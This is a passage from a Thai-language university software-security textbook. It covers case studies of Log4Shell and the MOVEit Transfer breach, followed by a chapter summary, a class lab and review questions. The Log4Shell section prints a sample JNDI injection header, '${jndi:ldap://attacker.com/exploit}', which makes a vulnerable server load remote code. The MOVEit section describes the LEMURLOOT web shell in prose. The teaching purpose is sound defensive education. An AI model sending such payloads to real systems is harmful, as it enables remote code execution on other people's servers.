### กรณีศึกษา 3: Log4Shell (CVE-2021-44228) - ธันวาคม 2564

**ปที่เกิดเหตุการณ:** เปดโพลง 9 ธันวาคม 2564 (ถูกใชโจมตีกอนหนานี้แลว)
**ประเภทการโจมตี:** Remote Code Execution (RCE) ผาน Java Library
**คะแนน CVSS:** 10.0 (Critical)
**ผูไดรับผลกระทบ:** นับแสนระบบทั่วโลก เนื่องจาก Log4j ถูกใชในซอฟต์แวร์นับไมถวน

**สาเหตุของเหตุการณ:**
Log4Shell เป็นช่องโหว่ใน Apache Log4j 2 ซึ่งเป็นโลบราลีสำหรับบันทึกขอความ (Logging) ที่นิยมมากที่สุดในภาษา Java เนื่องจากเป็นส่วนหนึ่งของ Spring Boot Framework และไลบราลี Java จํานวนมาก

ช่องโหว่เกิดจากฟงกชัน JNDI (Java Naming and Directory Interface) Lookup ใน Log4j ที่อนุญาตใหใช "${}" ในขอความ log เพื่อคนหาคาจากระบบภายนอกผาน LDAP, DNS, RMI และโปรโตคอลอื่นๆ โดยไมมีการตรวจสอบข้อมูลนําเขาอยางปลอดภัย

**หลักการทํางานของช่องโหว่:**
1. ผูโจมตีสง HTTP request โดยใส string พิเศษใน HTTP header เช่น
   ```
   User-Agent: ${jndi:ldap://attacker.com/exploit}
   ```
2. เมื่อเซิรฟเวอรบันทึก log ขอความนี้ Log4j จะเห็น ${...} และทํา JNDI lookup
3. JNDI lookup จะติดตอไปยัง LDAP server ของผูโจมตี และโหลด Java class ที่เป็นอันตราย
4. Java class ที่ถูกโจมตีจะสามารถรันคําสั่งใดๆ บนเซิรฟเวอรได

**ผลกระทบ:**
- Apache Log4j ถูกใชในซอฟต์แวร์นับแสนตัว รวมถึง
  - เซิรฟเวอร Minecraft (ตรวจพบการโจมตีกอนเปดโพลง)
  - Apple iCloud
  - Amazon Web Services
  - Steam
  - Twitter (ปจจุบันคือ X)
  - ผลิตภัณฑของ VMware, Cisco, IBM, Oracle ฯลฯ
- ภายใน 24 ชั่วโมงหลังเปดโพลง มีการสแกนหาช่องโหว่หลายลานครั้ง
- องคกรส่วนใหญต้องใชเวลาหลายสัปดาหถึงหลายเดือนในการสํารวจและอัปเดตระบบ
- CISA ออกคําสั่งใหหนวยงานรัฐบาลสหรัฐฯ แกไขภายในวันที่ 24 ธันวาคม 2564 (เพียง 15 วัน)

**บทเรียนที่ได:**

**1. ผลกระทบของ Third-party Dependency ตอระบบนิเวศซอฟต์แวร์ทั้งหมด**
Log4j เป็นโลบราลีที่ถูกใชโดยซอฟต์แวร์นับแสนตัว ช่องโหว่ในคอมโพเนนตเดียวกอใหเกิดความเสียหายในวงกว้างมหาศาล

**2. ความต้องการ Software Bill of Materials (SBOM)**
หากไมมี SBOM องคกรไมรูวาระบบใดใช Log4j บาง ทําใหการตอบสนองตอช่องโหว่ลาชา

**3. การเขารหัสและป้องกันข้อมูลตั้งแต่ตนทาง**
ช่องโหว่นี้เกิดจากการที่ Library ทํา JNDI lookup โดยไมมีการตรวจสอบวาข้อมูลนําเขาถูกต้องหรือไม (Input Validation) และไมมี Network Egress Filtering ที่ป้องกันการเชอมตอ LDAP ออกไปภายนอก

**4. การใช Supply Chain Security Tools**
เครื่องมือ SCA (Software Composition Analysis) เช่น Trivy, Snyk, OWASP Dependency-Check สามารถตรวจสอบวาโค้ดใช Log4j อยูหรือไม

**5. Zero Trust และ Network Segmentation**
การป้องกันดวย Firewall และ Egress Filtering ที่ดีสามารถชวยจํากัดการทํางานของช่องโหว่นี้ได แมจะมีช่องโหว่อยู แตถาไมสามารถติดตอกับภายนอกไดก็จะใชประโยชนไดยาก

**คําถามสำหรับการอภิปรายในชั้นเรียน:** Log4Shell เกิดจากบั๊กในการออกแบบ (Design Flaw) ไมใชบั๊กในการเขียนโค้ด (Implementation Bug) ทานเห็นดวยหรือไม เพราะเหตุใด

### กรณีศึกษา 4: MOVEit Transfer Attack (2023)

**ปที่เกิดเหตุการณ:** ตรวจพบการโจมตีตั้งแต่วันที่ 27 พฤษภาคม 2566 เปดโพลง 31 พฤษภาคม 2566
**ประเภทการโจมตี:** SQL Injection Zero-day (CVE-2023-34362)
**กลุมผูโจมตี:** Clop Ransomware Gang (TA505)
**ผูไดรับผลกระทบ:** องคกรกวา 2,000 แหงทั่วโลก รวมถึงหนวยงานรัฐบาลและบริษัทขามชาติ

**สาเหตุของเหตุการณ:**
MOVEit Transfer เป็นซอฟต์แวร์สำหรับสงไฟลที่ปลอดภัย (Managed File Transfer - MFT) ที่พัฒนาโดย Progress Software กลุม Clop ซึ่งเป็นกลุม Ransomware-as-a-Service ที่มีชื่อเสียง คนพบ SQL Injection Zero-day ใน MOVEit Transfer ที่ทําใหผูโจมตีที่ไมต้องการยืนยันตัวตนสามารถเขาถึงฐานข้อมูลของ MOVEit ได

**ลําดับเหตุการณ:**
1. ระบบมีการแทรกซึมตั้งแต่ป 2564: Clop ทดลองใชช่องโหว่นี้มาแลวตั้งแต่ป 2564
2. ปลายเดือนพฤษภาคม 2566: Clop เริ่มโจมตี MOVEit Transfer ที่ติดตั้งบนอินเทอรเน็ตหลายพันระบบพรอมกัน
3. 31 พฤษภาคม 2566: Progress Software ออกแจ้งเตือนและประกาศ CVE-2023-34362
4. 5 มิถุนายน 2566: Clop อางความรับผิดชอบใน Dark Web
5. 6 มิถุนายน 2566: Clop ใหเวลาองคกรที่ตกเป็นเปาหมายติดตอเจรจาภายในวันที่ 14 มิถุนายน

**เทคนิคการโจมตี:**
1. **SQL Injection:** ผูโจมตีใช SQL Injection เพื่อเขาถึงฐานข้อมูล MOVEit Transfer โดยไมต้องการยืนยันตัวตน
2. **Web Shell (LEMURLOOT):** หลังจากเขาถึงฐานข้อมูลได ผูโจมตีติดตั้ง web shell ที่ชื่อ LEMURLOOT (เขียนดวย C#) โดยปลอมเป็นไฟล human2.aspx
3. **การยืนยันตัวตน:** Web shell ใช password แบบ 36 ตัวอักษรสุมที่สงผาน HTTP header ชื่อ X-siLock-Comment
4. **ขโมยข้อมูล:** Web shell สามารถอานและดาวนโหลดไฟลทั้งหมดที่ MOVEit จัดการ
5. **การซอนรอย:** Web shell สงผลลัพธกลับเป็น SVG image เพื่อปกปองการรับสงข้อมูลผิดปกติ

**ผลกระทบ:**
- องคกรกวา 2,000 แหงทั่วโลกไดรับผลกระทบ
- ผูไดรับผลกระทบ: BBC, British Airways, Boots (UK), Shell, Minnesota Department of Education, US Federal Agencies
- Clop เรียกคาไถแตละองคกรตังแต 1 ลานเหรียญสหรัฐขึ้นไป
- Progress Software ต้องออกแพตชดวนหลายครั้ง (CVE-2023-35036, CVE-2023-35708 เพิ่มเติม)
- คาใชจายโดยประมาณในการตอบสนองตอเหตุการณรวมกันหลายพันลานเหรียญสหรัฐ

**บทเรียนที่ได:**

**1. Zero-day ใน Third-party Software เป็นภัยคุกคามที่จัดการยาก**
องคกรที่ใช MOVEit Transfer ไมสามารถป้องกันเหตุการณนี้ไดโดยตรง เพราะเป็น Zero-day การแกปญหาทําไดแคอัปเดตเมื่อผูผลิตออกแพตช

**2. ความสำคัญของการแบงแยกเครือขาย (Network Segmentation)**
ระบบที่ใชรับสงไฟลไมควรมีสิทธิ์เขาถึงข้อมูลที่สำคัญทั้งหมดขององคกรโดยไมมีขอจํากัด

**3. การเขารหัสข้อมูล (Encryption at Rest)**
หากไฟลที่ MOVEit จัดการถูกเขารหัสไว การขโมยไฟลก็จะไมเกิดประโยชนตอผูโจมตี

**4. การจํากัดการเขาถึง Internet ของซอฟต์แวร์**
Web shell ต้องอาศัยการสงข้อมูลออกไป (Egress) ซึ่งควรถูกจํากัดโดย Firewall ไมใหซอฟต์แวร์ใดๆ เชื่อมตออินเทอรเน็ตไดโดยไมจําเป็น

**5. การสํารวจและเฝาระวัง Asset**
องคกรต้องมีระบบ Asset Inventory ที่รูวาใช MOVEit Transfer ที่ไหนบาง เพื่อใหสามารถตอบสนองไดอยางรวดเร็วเวลามีช่องโหว่

**คําถามสำหรับการอภิปรายในชั้นเรียน:** การโจมตี Zero-day เช่น MOVEit เป็นสิ่งที่ยากจะป้องกันกอนผูผลิตออกแพตช ในฐานะองคกร ทานจะออกแบบมาตรการรับมือเพื่อลดความเสียหายลวงหนาไดอยางไร

## สรุปทายบท

บทนําเกี่ยวกับความมั่นคงปลอดภัยของซอฟต์แวร์นี้ไดนําเสนอภาพรวมของสาขาวิชาที่สำคัญในยุคที่ซอฟต์แวร์เป็นหัวใจของทุกองคกรและทุกชีวิตประจําวัน

**ประเด็นสำคัญ:**
1. Software Security ครอบคลุมความปลอดภัยตั้งแต่การออกแบบซอฟต์แวร์จนถึงการบํารุงรักษา แตกต่างจาก Application Security, Network Security และ Information Security
2. ช่องโหว่ในซอฟต์แวร์เกิดจากความซับซอน ขอจํากัดด้านทรัพยากร และความผิดพลาดของมนุษย
3. ระบบ CVE, CWE, NVD และ CVSS เป็นมาตรฐานสากลสำหรับการระบุ จําแนก และใหคะแนนช่องโหว่
4. Security Mindset เป็นทักษะสำคัญที่ต้องฝกฝน โดยเฉพาะการคิดแบบผูโจมตี
5. Defense in Depth, Zero Trust, Assume Breach และ Least Privilege เป็นหลักการสำคัญในการออกแบบระบบที่ปลอดภัย
6. ผูโจมตีมีหลายประเภทตั้งแต่ Script Kiddie ไปจนถึง APT ที่ไดรับการสนับสนุนจากรัฐ
7. Attack Surface คือพื้นที่และชองทางทั้งหมดที่ผูโจมตีสามารถโจมตีได ยิ่งซับซอนมาก พื้นที่โจมตียิ่งกว้าง
8. การทดสอบความปลอดภัยต้องทําภายใตชอบเขตที่กฎหมายและจริยธรรมกําหนด
9. กรณีศึกษา Equifax, SolarWinds, Log4Shell และ MOVEit สอนบทเรียนสำคัญเกี่ยวกับผลกระทบของช่องโหว่ในซอฟต์แวร์

**แนวคิดที่ต้องนําติดตัวไปตลอดภาคการศึกษา:**
- "ไมมีซอฟต์แวร์ใดที่ปลอดภัย 100% แตเราสามารถบริหารจัดการความเสี่ยงใหอยูในระดับที่ยอมรับได"
- "คิดเหมือนผูโจมตี แต่ทำงานเหมือนผูป้องกัน"
- "ความปลอดภัย ไมใชฟงกชันเพิ่มเติม แตเป็นคุณสมบัติที่ต้องออกแบบตั้งแต่แรก"

### Lab 1.1: วิเคราะหกรณีศึกษาเหตุการณโจมตีจากช่องโหว่ซอฟต์แวร์

**วัตถุประสงค:**
1. วิเคราะหสาเหตุของช่องโหว่และวิธีการโจมตีในเหตุการณจริง
2. ระบุบทเรียนที่นํามาประยุกตใชในการพัฒนาซอฟต์แวร์ของตนเอง
3. เชื่อมโยงข้อมูลสถิติและกรอบมาตรฐานสากล (CVE, CWE, CVSS) กับเหตุการณจริง

**เวลาที่ใช:** 50 นาที

**ขั้นตอน:**

**ส่วนที่ 1: ศึกษาและวิเคราะหกรณีศึกษา (20 นาที)**
1. แบงกลุมนักศึกษากลุมละ 3-4 คน
2. แตละกลุมเลือก 1 กรณีศึกษา จาก 4 กรณีตอไปนี้
   - Equifax Data Breach (CVE-2017-5638)
   - SolarWinds Supply Chain Attack (SUNBURST)
   - Log4Shell (CVE-2021-44228)
   - MOVEit Transfer (CVE-2023-34362)
3. แตละกลุมคนควาเพิ่มเติมจากแหลงตอไปนี้
   - NVD: nvd.nist.gov (คนหา CVE ID)
   - CISA: cisa.gov (Known Exploited Vulnerabilities Catalog)
   - Vendor Advisory: Apache, Progress Software, SolarWinds
   - Security News: BleepingComputer, KrebsOnSecurity, The Register

**ส่วนที่ 2: วิเคราะหตามกรอบ (15 นาที)**
วิเคราะหกรณีศึกษาตามประเด็นตอไปนี้
1. CVE ID และคะแนน CVSS (ถามี)
2. สาเหตุของช่องโหว่ (CWE Category)
3. วิธีการโจมตีและลําดับเหตุการณ
4. จํานวนผูไดรับผลกระทบและความเสียหาย
5. มาตรการป้องกันที่ควรมี (Defense in Depth)
6. บทเรียนที่นําไปใชในการพัฒนาซอฟต์แวร์

**ส่วนที่ 3: นําเสนอและอภิปราย (15 นาที)**
1. แตละกลุมนําเสนอผลการวิเคราะหหนาชั้นเรียน (3-4 นาทีตอกลุม)
2. อภิปรายรวมทั้งชั้นในประเด็น "บทเรียนรวมที่ทุกกรณีศึกษามีเหมือนกัน"

**คําถายทาย Lab:**
1. กรณีศึกษาที่เลือกมี CWE Category ใดบาง และจุดออนนั้นสามารถป้องกันไดตั้งแต่ขั้นตอนใดของ Secure SDLC
2. หากทานไดรับมอบหมายใหตรวจสอบซอฟต์แวร์ขององคกรวามีความเสี่ยงตอช่องโหว่แบบเดียวกับที่ศึกษา ทานจะเริ่มตนอยางไร และจะใชเครื่องมือใดบาง
3. ทานคิดวาหากนําหลักการ Zero Trust มาใชในกรณีศึกษา จะสามารถป้องกันหรือลดความเสียหายไดหรือไม อยางไร
4. เปรียบเทียบความแตกต่างระหวางการโจมตีที่เป็น Known Vulnerability (Equifax) กับ Zero-day (Log4Shell, MOVEit) ในแงของมาตรการป้องกัน

### Lab 1.2: สํารวจ OWASP WebGoat และความสำคัญของซอฟต์แวร์ที่มีช่องโหว่

## คําถามทายบท

**คําถามแบบอัตนัย:**

1. จงอธิบายความแตกต่างระหวาง Software Security, Application Security, Network Security และ Information Security พรอมยกตัวอยางสถานการณที่แสดงใหเห็นวาทั้ง 4 นี้ทํางานรวมกันอยางไร

2. เหตุการณ SolarWinds Supply Chain Attack (SUNBURST) เกิดขึ้นไดอยางไร มีผลกระทบอะไรบาง และทานคิดวาแนวทางใดมีประสิทธิภาพมากที่สุดในการป้องกันการโจมตีแบบ Supply Chain Attack

3. Security Mindset คืออะไร จงอธิบายพรอมยกตัวอยางประกอบ และอธิบายวามันแตกต่างจากการพัฒนาซอฟต์แวร์ทั่วไปอยางไร

4. อธิบายความแตกต่างระหวาง CVE, CWE, NVD และ CVSS พรอมยกตัวอยาง CVE ID ที่รูจักและระบุ CWE และ CVSS Score

5. จงยกตัวอยาง Trade-off ระหวาง Security กับ Usability ที่พบในชีวิตประจําวัน อยางนอย 3 ตัวอยาง พรอมอธิบายวาทานจะตัดสินใจอยางไรในแตละกรณี

6. หลักการ Defense in Depth คืออะไร จงอธิบายแตละชั้นพรอมตัวอยางมาตรการป้องกันในแตละชั้นสำหรับเว็บแอปพลิเคชัน

7. จงเปรียบเทียบขอแตกต่างระหวาง Script Kiddie, Black Hat Hacker, White Hat Hacker และ APT ในด้านทักษะ แรงจูงใจ และผลกระทบตอระบบ
